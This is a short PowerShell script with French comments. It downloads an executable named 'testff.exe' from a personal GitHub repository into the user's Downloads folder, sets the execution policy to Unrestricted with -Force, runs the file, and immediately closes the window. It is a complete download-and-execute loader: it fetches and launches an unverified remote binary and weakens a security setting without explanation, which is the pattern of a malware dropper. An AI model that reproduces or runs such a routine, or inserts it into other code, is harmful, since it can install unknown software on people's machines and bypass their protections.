# Définir l'URL du fichier à télécharger
$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

# Obtenir le nom d'utilisateur actuel
$userProfile = [System.Environment]::GetFolderPath("UserProfile")

# Définir le chemin local dans le dossier "Téléchargements"
$localPath = "$userProfile\Downloads\testff.exe"

# Fonction pour afficher l'emplacement du fichier
function Show-FileLocation {
    param (
        [string]$filePath
    )
    Write-Output "Le fichier a été téléchargé à l'emplacement suivant : $filePath"
}

# Afficher le chemin de téléchargement
Write-Output "Chemin de téléchargement : $localPath"

# Créer le répertoire "Téléchargements" s'il n'existe pas
if (-Not (Test-Path -Path "$userProfile\Downloads")) {
    New-Item -ItemType Directory -Path "$userProfile\Downloads"
    Write-Output "Le répertoire 'Téléchargements' a été créé."
}

# Télécharger le fichier avec Invoke-WebRequest
try {
    Invoke-WebRequest -Uri $url -OutFile $localPath
    Write-Output "Le fichier a été téléchargé avec succès."
    Show-FileLocation -filePath $localPath
} catch {
    Write-Output "Erreur lors du téléchargement du fichier : $_"
}

# Vérifier si le fichier a été téléchargé avec succès
if (Test-Path $localPath) {
    Write-Output "Le fichier existe à l'emplacement : $localPath"

    # Désactiver la politique d'exécution
    Set-ExecutionPolicy Unrestricted -Force

    # Lancer le fichier exécutable
    try {
        Start-Process -FilePath $localPath
        Write-Output "Le fichier a été exécuté avec succès."
    } catch {
        Write-Output "Erreur lors de l'exécution du fichier : $_"
    }
} else {
    Write-Output "Le fichier n'a pas été téléchargé correctement."
}

# Fermer la fenêtre PowerShell immédiatement
Write-Output "Fermeture de la fenêtre PowerShell..."
exit
